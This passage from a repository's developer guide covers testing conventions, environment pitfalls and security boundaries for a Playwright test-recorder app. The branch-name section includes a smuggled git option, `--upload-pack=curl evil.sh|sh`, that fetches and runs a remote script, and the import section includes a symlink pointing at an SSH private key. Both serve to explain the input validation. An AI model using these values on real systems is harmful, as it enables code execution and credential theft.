files a salvaged trace by? The repo's own comment said `<slug>/retryN/`, a
nested directory Playwright does not produce. It runs a test that fails once
and passes on retry and asserts two manifests, two statuses, markers under both
attempts, and both scratch directories. The laptop-speed half is
`check:retry-evidence`, which executes the shipped fixture and reporter strings
without a browser. **Changing where an attempt's artifacts go, or how the
attempt is read? Add a row.**

**`frame-parity.spec.ts`** is the fourth, and the iframe engine's authority: the
emitted `frameLocator` chain, executed by real Playwright, must resolve the
element the recorder meant — one hop, two hops, and with element context inside
the frame. `frame-engine.test.ts` pins the emission SHAPE in Node, but the shape
is only right if Playwright's `frameLocator` resolves it the way the generator
assumes, and a model of that cannot settle it. The trainer cannot yet capture
inside a frame (see docs/IFRAMES.md); this proves a hand-written, AI-written or
imported framed step RUNS. **Changing `root()`, `FrameRef`/`frameSelector`, or
the parser's `frameLocator` reader? Add a row.**

**`check:shell-drift` has retired itself.** It guarded the Glaze tree and the Electron tree against drifting apart, and on 2026-08-09 they became one: `main` carries no `@glaze/*` dependency, and the stale `shell/electron` branch was deleted (preserved as the tag `archive/shell-electron`). The script was written to expect exactly this — with no counterpart ref it prints `nothing to compare` and exits 0, deliberately rather than failing, because a guard that goes red because its problem was *solved* trains people to ignore it. Leave it wired up: it costs nothing and it is what would notice a second shell reappearing.

- **Vitest** (`vitest.config.ts`) has two projects. **`node`**: `main/**/*.test.ts`, `mcp/**/*.test.ts`, `renderer/lib/**/*.test.ts`. **`dom`** (jsdom): `renderer/**/*.test.tsx`, `renderer/dev/**/*.test.ts`, plus `main/**/*.dom.test.ts` — that suffix is for BACKEND code needing a document (the injected replayer and Auto-Heal probe are evaluated for real). The node project explicitly excludes `*.dom.test.ts`; without that they match both globs and run again with no DOM, failing for unrelated reasons. **A `.ts` test under `renderer/` outside `lib/` or `dev/` matches NEITHER project and is silently never run** — that is why `renderer/dev/**/*.test.ts` is listed by hand.
- **Two checks BOOT what they test rather than reading it**: `check:mcp-boot` spawns the MCP server and speaks stdio JSON-RPC to it, and `check:cli-exit` spawns `bin/good-looks.mjs` and reads the process's own exit code. Both exist because of the same blind spot — every other `check:mcp-*` read source or imported pure modules and stayed green for the six months the server threw at module load. A single entry point with an argv contract has exactly that shape. `check:cli-exit` also reads stdout **through a pipe**, which is the only way to catch a regression to `process.exit()`: that truncates a piped stdout, so the CLI prints nothing under CI and everything in a terminal.
- **`check:*` scripts** predate Vitest and are kept, not migrated — they catch real bugs and a rewrite would risk that for tooling neatness. Plain assertions + a non-zero exit; no runner. Six are deliberately *source-level* (`check:ai-debug-scroll`, `check:scroll-layout`, `check:narrow-layout`, `check:clickable-chrome`, `check:dialog-footer`, `check:drift-gap`) because they guard layout contracts that jsdom cannot observe — occlusion, which jsdom cannot see at all (an element covering a button leaves every rendered test passing), and overflow, which it renders as zeros in both the fixed and the broken case.
- **A generated spec is only proven by the real CLI.** `glaze-runtime.mjs` is loaded through Playwright's own Babel transform, which nothing else in the repo runs: the unit tests and `e2e/assert-parity.spec.ts` import the emitted module through Node's loader instead, where syntax the transform mishandles is perfectly legal. That gap hid a runtime that failed to load for every helper-using test while the whole suite stayed green — see DECISIONS 2026-08-21. `check:runtime-boot` closes it by booting real `generateSpec` output through the real CLI, and reads the helper list off the emitted source, so **adding a runtime helper needs a row in its `ROWS` table** (the check fails naming the helper if you forget). Anything else that ships as source we do not execute here — a fixture, a reporter, a config — has the same blind spot.
- **Adding a check?** Anything importing `@shell/backend` must be bundled with esbuild + `--alias:@shell/backend=./main/services/__tests__/glaze-backend-stub.ts --external:electron`; pure logic can run under `tsx`. **Bundled checks do NOT type-check — `npm run type-check` is the real gate for them.**

### Conventions that matter

- **Touching the AI debug feature? Extend `renderer/main/ai-debug-icons.test.tsx`.** The status icon's colour (blue ready / orange thinking / green ready-for-review / red failed) is the whole contract of a minimized job, and a wrong colour is silent: the panel works perfectly while the icon lies, so the user walks away from a finished answer or waits on a dead one. Nothing else catches it — not lint, not type-check, not the panel's own tests. Cover every surface the change can reach (run panel, trainer step rows, global chip).

- **A cache a RUN writes is invalidated in one place: `renderer/lib/run-derived-cache.ts`.** Never from a view. A `runs:changed` subscription inside a route component only runs while that route is mounted, so the refresh silently becomes "refresh this if the user happens to be looking" — that is how the Stats board's Stability, Auto-Heal and Visual tiles came to never refresh after a run, and it is the third time this exact shape has shipped (the sidebar's stale verdict dot, then `batch-view`'s invalidation). Adding a query key whose content depends on run history or run artifacts? Add it to `RUN_DERIVED_KEYS`. `check:derived-cache` enforces both halves. Note the mocking trap that hid it: `on: () => () => {}` makes the push bridge inert, so a component test can cover a whole view and never touch its live-refresh path.

- **Verify a test can fail.** After writing a test that should catch a bug, revert the fix and confirm *that* test fails. Several tests in this repo were written against behaviour that turned out to differ from the assumption; the revert is what catches it.
- **Never guard an assertion with `if (thing)`** — it passes vacuously the day `thing` stops rendering.
- **Wait for content, not containers.** A view's table renders *before* its query resolves, so `findByRole("table")` succeeds against an empty body and reads as "no data". Wait for rows.
- Mock the `api` module, not the IPC bridge — tests then state intent rather than channel plumbing.

### Environment gotchas (all cost real debugging time)

- **`process.env.TZ = undefined` sets the STRING `"undefined"`**, which Node reads as an unknown zone and falls back to UTC — for the rest of the file, not just the block that did it. A test that sets TZ must `delete` the key to restore it when there was none, which is the usual case on a laptop and never the case on a CI runner that exports `TZ=UTC` (so the bug is invisible in CI). It bites hardest where a `describe`'s `const` timestamps are built at COLLECTION time in the real zone and the `it` bodies build theirs later in the leaked one — the two then disagree by the offset, and every failure reads as a scheduling bug. See DECISIONS 2026-08-17.
- **jsdom has no layout engine.** `getBoundingClientRect()` returns zeros, so anything gated on element size behaves as if hidden — this silently turns "assert hidden" tests into tests that prove nothing. `step-replayer.dom.test.ts` installs a nominal box.
- `renderer/__tests__/setup.ts` stubs what jsdom lacks: `matchMedia`, `IntersectionObserver`, `ResizeObserver`, `scrollTo`/`scrollIntoView`. A missing one surfaces as a bare `ReferenceError` from inside the SDK bundle and reads like a component bug.
- **Radix `TabsTrigger` activates on pointer-down/focus, not a bare `click`** — `fireEvent.click` leaves the tab unchanged and assertions silently run against the previous tab.
- **`SidebarListItem` activates on `mouseDown`**, same idiom, same silent failure: `fireEvent.click` doesn't fire its `onClick`, and the assertion then reports "0 calls", which reads as a broken handler rather than the wrong event. Use `fireEvent.mouseDown`.
- **`check:repo-hygiene` scans `git ls-files` — the TRACKED set — so running it on a new file before `git add` proves nothing.** It passes, because the file is not in the set yet, and then fails in CI on the commit that adds it. Cost a CI round trip on #284, where a comment quoting a `/Users/…` path as an example of what NOT to store tripped the hardcoded-home-directory rule. `git add -A` first, or run it after committing.
- **A fresh worktree needs `npm run bootstrap` before anything else.** Without it there is no `node_modules`, and the first `vitest` run CREATES an empty one for its own cache (`node_modules/.vite`) — which then makes `bootstrap` report "already present — nothing to do" and leaves you permanently broken. `vitest.config.ts` then points every React alias into a tree with no React, and every component test fails at import reading like a missing dependency; `type-check` degrades separately, reporting `Property 'children' does not exist` on SDK components across files you never touched. Fix: `rm -rf node_modules && npm run bootstrap`.
- **`npm run package` needs a REAL install in the worktree — a bootstrapped symlink is not enough, and this is true even when the dependencies are identical.** Everything that resolves modules the way Node does is happy with the link (lint, type-check, `test:all`, `build`, `dev`); electron-builder is the one thing that reads `node_modules` itself, and through a symlink it finds the direct dependencies and nothing below them. It prints `cannot find path for dependency` for ~80 transitive packages and **exits 0**. The bundle then carries `@playwright/test` without `playwright`/`playwright-core`, so the app launches perfectly and **every test run fails** — the runner spawns the Playwright CLI out of the bundled tree. Fix: `rm node_modules && npm install --include=dev` (that removes the link, not the tree it points at). `npm run package` now refuses up front and re-checks the finished bundle; see `scripts/verify-package.mjs` and `check:package-integrity`.
- **Radix-backed `Tooltip` cannot be opened in jsdom.** Its trigger tracks pointers with APIs jsdom doesn't implement, so `pointerEnter`/`pointerMove`/`focus` all leave the content unmounted and the assertion reports as "unable to find the text" — which reads as wrong copy rather than an undrivable control. Same shape as the `Select` below: export the copy and assert it directly, and make sure the same string is reachable without hover (Stability puts it in the expanded row).
- **The SDK's `Select` is native-menu-backed**: its options never enter the DOM, so no Testing Library query reaches them. The default move is to assert the displayed value and cover persistence at the IPC layer. It IS drivable when a handler does something the store cannot do for it: the menu is opened through `glazeAPI.Menu.popup`, so stubbing that to resolve with the `commandId` of the wanted label runs the same handler a real click would (`appearance-pane.test.tsx`). Scaffolding, so reach for it only when there is behaviour on the near side of the store to cover — as the typeface row has, since it applies the change to its own document.
- An ambiguous `findBy*` (matching 2+ elements) retries until timeout, which reports as "never rendered" rather than "your query was ambiguous".
- **`type-check` does not check SDK component props.** `<Text color="totally-not-a-color">` compiles clean on this tree — verified by compiling exactly that. `cva` falls through to the variant default when handed an unknown key, so a misspelt colour or variant renders as ordinary text and nothing throws. `add-step-dialog.tsx` shipped `color="danger"` this way and the invalid-property warning rendered in default foreground for its whole life. `check:text-color` guards `Text`'s colour; every other component prop is still unchecked here. This is the reason the redesign's theme layer declares its own `--gl-*` tokens rather than borrowing names: a custom property we declare is one `check:theme-tokens` can prove resolves, and an SDK class or prop is not.
- **A class that does not exist emits nothing and throws nothing**, and this repo has shipped that bug three times (`bg-muted`, the `border-token-*` family, then twenty-eight SDK class names the port never bridged). It applies to the theme layer's own names too — `className="gl-setting-groupp"` compiles, lints, type-checks and renders as an unstyled div — which is why `check:renderer-classes` audits `gl-*` in a second pass as of B4. **A rule can also be present and inert**: a bad merge once nested an entire screen's section inside `.gl-detail-tabs [role="tab"] { … }`, which is valid CSS, builds clean, and passes a text-matching audit while styling nothing — so the same check now asserts that no theme stylesheet nests a style rule inside another style rule (at-rules are fine). **`check:renderer-classes` is the general guard**: it builds the renderer and asks the EMITTED stylesheet whether every class used in a class-list context produces a rule, and whether every `var(--x)` read is declared. Two traps it encodes, both of which cost time here. A class may be legitimately used only behind a variant, so the oracle matches `.foo` *and* `\:foo` — anchoring on `.` alone reports working code as broken. And Vite hashes CSS filenames without clearing stale ones, so it builds into a fresh temp dir; auditing a reused `build/` reads whichever old sheet sorts first and will tell you a fix did not work. **A class resolving to the WRONG value is worse than one resolving to nothing** — see `text-secondary` in DECISIONS 2026-08-09 — so if you add a `--color-*` key, check what else Tailwind derives from it. **And a class ALONE in a string literal was the check's blind spot until 2026-08-14**: to avoid flagging prose and CSS property names it skips a literal when nothing in it is emitted and it holds no layout utility, which a single missing class satisfies — that is how three of the run-verdict dot's five states shipped transparent, built as `{ className: "bg-support-yellow-orange" }`. Tokens naming this repo's own `support-*` vocabulary are now trusted without corroboration; anything you add in that shape, verify by deleting the `--color-*` key and watching the check go red.
- **jsdom normalises `color` and `background` but NOT `box-shadow`.** An inline `#6bff9e55` reads back from `.style.color` as `rgba(107, 255, 158, 0.333)` and from `.style.boxShadow` as the original hex. The failure that matters is the NEGATIVE assertion: `expect(el.style.boxShadow).not.toContain("rgb(...)")` can never fire, so it passes against a shadow that does contain the colour. Check either notation (see `renderer/theme/primitives/step-row.test.tsx`).
- **Playwright compiles the TSX it loads with its OWN component-testing JSX runtime.** Importing a renderer component into an `e2e/*.spec.ts` and server-rendering it fails with `Objects are not valid as a React child (found: object with keys {__pw_type, …})`, which reads as a bug in the component. Render the fixture in a separate process under `tsx` and pass the markup in — `e2e/dialog-footer-fixtures.tsx` is the pattern. Worth the detour: markup hand-copied into a spec passes while the real component is broken, which is the whole failure mode a layout test exists to catch.
- This project targets **ES2020**: no `Array.prototype.at`.

## The capture boundary is a security boundary

The trainer loads **arbitrary untrusted websites**, and the injected capture script hands steps back from a page that can run its own JavaScript alongside it. Steps are then compiled into a `.spec.ts` that Playwright **executes in Node**. So: page input → generated code → executed. An unchecked field on that path is remote code execution, and it already was one — a page setting `count` to a string got arbitrary Node code into the spec, because the generator interpolated numerics raw on the strength of their TypeScript type.

- **Everything crossing that boundary goes through `normalizeRawStep` / `normalizeStep` / `normalizePickedElement` in `main/recorder/types.ts`.** There are three page-JSON entry points in `recorder-service.ts` (the capture channel, refine-mode picked element, right-click pick-at-point) plus two IPC ones (`insertStep`, `tests:updateSteps`). A new one must normalize too.
- **Steps travel on TWO channels and there is exactly ONE ingest** (`recordCaptured`, the file's only `normalizeRawSteps` call). A click emits its step over the console channel the instant it is captured — a DOM queue read on a poll loses to the navigation the click just started, which is the bug that made routed clicks vanish (see `main/recorder/capture-channel.ts` and DECISIONS 2026-08-13). A second channel is a second boundary to forget; `check:capture-egress` fails if one appears that does not normalize.
- **Capture state lives in the recorder's isolated world (`window.__glCapture`), not on `<html>`.** A page can strip every attribute off its own root element, so an attribute-based install marker lies — and the backend re-injects when capture reports missing, which over live listeners would double every step. The world global and the listeners are created together, so "installed" cannot be wrong in either direction.
- **They REBUILD, they don't filter.** Spreading the input and overwriting known keys carries every unknown key with it, so the next field wired into the generator silently becomes a hole again.
- **A TypeScript type is not a runtime check.** Anything reaching `script-generator.ts` as a bare numeral goes through `num()`; anything reaching it as a string goes through `q()`. Never concatenate a step field into generated source directly.
- **Fixing the boundary is not enough on its own.** Tests recorded before a fix are already on disk and are regenerated from their stored steps, so the generator needs its own guard regardless.
- Guarded by `check:step-ingest`, which pins both properties independently.

## An imported project is untrusted input too

Importing clones or reads a folder of someone else's Playwright code and copies the files an imported spec relative-imports, so it still runs once the checkout is gone. A relative specifier is text in a file the *importer* wrote, and `path.resolve` walks `..` as far as it's told — so the copy destination used to escape the scripts dir entirely, reaching an arbitrary absolute path. That fires on **import**, before any test is run, which is exactly when the user believes they're only looking.

- **Each imported test owns `scripts/imported/<id>/`.** Its spec and siblings keep their positions *relative to the project root*, so `../helpers/x.ts` resolves as it did in the original project without anything leaving that directory. Do not flatten an imported spec into the scripts dir — the old layout made escaping load-bearing, because a sibling one level up had to be written one level above the scripts dir for the spec's own `../` to find it.
- **Two boundaries in `copyRelativeImports`, both required:** `projectRoot` bounds what may be read, `destRoot` bounds what may be written. Keep the destination assert even when the paths are derived and "can't" escape.
- **Judge containment on real paths, both sides.** `statSync`/`copyFileSync` follow symlinks, so a repo shipping `helpers.js -> ~/.ssh/id_rsa` would copy that file's contents in. And realpath the ROOT too: on macOS `/var` is a link to `/private/var`, so comparing a resolved path against an unresolved root rejects every legitimate sibling.
- `testStore.writeScript` writes to the record's existing path when it's inside the scripts dir, so editing an imported spec doesn't move it away from its siblings; `remove` deletes the whole sandbox.
- Guarded by `check:import-sandbox`.

## A branch name is untrusted input too

The branch switcher (`/branches`, `scripts/switch-branch.mjs`) takes a name from a **pull request's head ref** — chosen by anyone who can open a PR — and hands it to git as an argument *and* uses it to name a directory that is then **checked out, built and executed**. Two separate holes, and the reflex fix helps with neither:

- **`execFile` spawns no shell, so quoting is not the answer.** A ref called `--upload-pack=curl evil.sh|sh` is not command injection; it is an option git honours. Rejecting a leading `-` is what stops it. `--`-separated arguments and explicit refspecs are used as well, but only one of the two can be forgotten at a call site.
- **`path.resolve` walks `..` as far as it's told**, and what lands at the far end here is a whole checkout that then gets built and run. `worktreeDirFor` refuses any result outside the builds root, on resolved paths, and **throws rather than falling back** — there is no safe default directory.

**One validator, in `shared/branch-paths.mjs`.** The service is compiled TypeScript and the build script is plain `.mjs`; they cannot share a `.ts`, and a transcribed copy of the rule is right the day it's written and silently divergent afterwards. The direction it fails is the script accepting a name the app refuses. Guarded by `check:branch-switch`, which runs the real script against hostile names rather than only scanning source.

**Never let this feature touch the user's checkout.** Builds go into a git worktree under `userData/branch-builds/`. Switching the checkout in place would discard uncommitted work, rewrite the running app's own files, and leave no way back from a branch that doesn't build.

## Hard constraints

- **Never edit generated output: `build/`, `dist/`, `node_modules/`.** Changes there are lost on the next build. Everything else is yours to maintain: application code in `main/`, `renderer/`, `mcp/`; config in `package.json`, `tsconfig.json`, `vite.config.ts`, `vitest.config.ts`, `eslint.config.js`, `scripts/`; and repo-level files (`README.md`, `CLAUDE.md`, `PORTING.md`, `docs/`, `.github/`, `.gitignore`).
- **Only `main/shell/` may import `electron`.** Everything else in `main/` imports `@shell/backend`. Enforced by `no-restricted-imports` in `eslint.config.js` — don't suppress it. If an Electron API is genuinely needed, re-export it from the shim so there is still one seam.
- **`asar` must stay `false`** in the electron-builder config. The runner spawns the Playwright CLI as a real child process, and a path inside an asar archive is not a real path on disk.
- **Subprocess spawns must set `ELECTRON_RUN_AS_NODE=1`.** Under Electron `process.execPath` is the Electron binary; without the flag, spawning it launches a second copy of the app instead of running the CLI.
- The three alias tables — `tsconfig.json` paths, `vitest.config.ts`, and `scripts/build-main.mjs` — must agree. `@shell/backend` in particular resolves to the **stub** under test and to Electron at build time; a mismatch means tests silently exercise the wrong module.
- Don't install or configure Xcode, or run `xcode-select --install`, from this project.

## Electron API reference

Use the official Electron docs for exact signatures (<https://www.electronjs.org/docs/latest/api/app>). The local `node_modules/electron/electron.d.ts` is the authoritative version-matched source.

## Making a change

Feature work happens on a branch and lands through a pull request. `main` is the integration branch.

```bash
git switch -c feat/step-reordering
```

Branch names: `feat/…`, `fix/…`, `chore/…`, `docs/…`.

### Where work happens

Three kinds of tree touch this repo, and the 2026-08-18 collision (see
DECISIONS) came from mixing them: uncommitted copies of already-merged work
parked in the root checkout left `main` four commits behind and unable to pull
or switch branches.

- **The root checkout** — the clone GitHub Desktop pulls `origin/main` into —
  stays on `main` with a clean working tree, so that pull is always a
  fast-forward. It is where merged work arrives, not where work happens.
- **A local session** works in its git worktree under `.claude/worktrees/`
  (`npm run bootstrap` first — see the gotchas), on a branch cut from a fresh
  `origin/main`: `git fetch origin` before branching, because the local `main`
  ref may be days old. Worktrees share the repo's `.git`, so a branch
  COMMITTED in one is immediately visible to GitHub Desktop and to every other
  local tree — there is never a reason to copy files between trees.
- **A cloud session** works in its own clone; its work reaches the repo only
  as a pushed branch and a PR. No local tree should hold uncommitted copies of
  work a cloud session is landing.

Whichever tree it is: work leaves a session as a committed branch — pushed and
PR'd when the maintainer says to — or it does not leave. A session explicitly
pointed at the root checkout still branches first, commits only its own
changes, and returns the checkout to `main`, or says exactly why it could not.

**1. Write the change, and tests with it.** A suite nobody extends decays into one nobody trusts, and most bugs found in this codebase so far were silent — wrong behaviour that threw no error and looked fine on screen. See the Testing section for the conventions that matter, especially *verify a test can fail*.

**2. Run the full gate.** Nothing runs it for you; CI cannot (see below).

```bash
npm run lint && npm run type-check && npm run test:all && npm run build
```

**3. Run the app and look at it.** `npm run dev` (hot-reloading renderer) or `npm run package` for the real bundle. After any UI-affecting change, confirm it on screen before calling it done — this is the step most easily skipped and the one that catches what tests cannot. A renderer that throws during mount shows a blank window and a *clean* main log, so also check the log: renderer errors and warnings are forwarded there by `forwardRendererConsole`.

**4. Update the docs in the same commit.** If the change adds a service, moves a boundary, or invalidates something in `docs/ARCHITECTURE.md`, fix that entry. If it involved a real decision — a trade-off, a rejected alternative, a non-obvious constraint — add an entry to `docs/DECISIONS.md`. These were kept current automatically until 2026-08-06; they now stay accurate only if changes carry them.

**5. Open a pull request.** `.github/pull_request_template.md` carries the checklist, including the two security boundaries below.

### CI

`.github/workflows/repo-hygiene.yml` runs on every push and pull request and checks repo hygiene — no generated files committed, no absolute paths, no secrets, lockfile in sync.

**The rest of the gate now runs in CI too, and could not before.** Removing the SDK removed the reason: `@glaze/core` used to resolve to a Glaze.app install outside the repo, which no hosted runner has. Every dependency now comes from `npm install`, so `.github/workflows/gate.yml` runs `lint`, `type-check`, `test:all` and `build` on a stock `ubuntu-latest` runner, plus the Playwright e2e run (under `xvfb`), the browser-preview build, and an `electron-builder` package. **Every job runs on Linux** — macOS minutes cost roughly ten times as much — so CI packages `--linux dir` where `npm run package` builds the `.app`. What CI therefore does *not* prove is that the app packages as a mac app, or that `npm run build` works on macOS; both are on you locally.

Step 2 is still worth running locally — it is the fast feedback loop, and CI cannot tell you a UI change looks wrong. But a green gate.yml is now real evidence about this repo's own code, which a green checkmark here never used to be.
